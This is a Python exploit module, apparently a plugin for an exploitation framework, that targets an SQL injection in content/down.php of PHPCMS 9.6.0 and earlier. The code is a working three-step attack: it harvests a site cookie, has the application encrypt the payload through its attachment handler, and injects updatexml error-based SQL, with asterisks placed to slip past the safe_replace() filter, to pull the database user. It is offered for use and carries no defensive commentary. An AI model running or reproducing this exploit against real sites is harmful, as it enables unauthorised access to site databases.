#!/usr/bin/env python
# -*- coding:utf-8 -*-

import re
from urllib import quote

from lib.core import logger
from lib.thirdparty import requests

author = "Z3r0yu"
scope = "PHPCMS <= 9.6.0"
description = "PHPCMS content/down.php SQL Injection"
reference = "http://zeroyu.xyz/"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    },
    {
        "Name": "Thread",
        "Current Setting": "10",
        "Required": False,
        "Description": "线程数"
    },
]

def phpcms_exp(url):

    TIMEOUT=5
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    # use "*" to bypass filter "safe_replace()" in PHPCMS
    payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="

    cookies = {}
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False

    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            break
    else:
        return False

    setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
    result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
    if result[0]:
        return "{} : {}".format(url, result[0])

def exploit(URL,Thread):
    logger.process("Requesting target site:"+URL)
    return phpcms_exp(URL)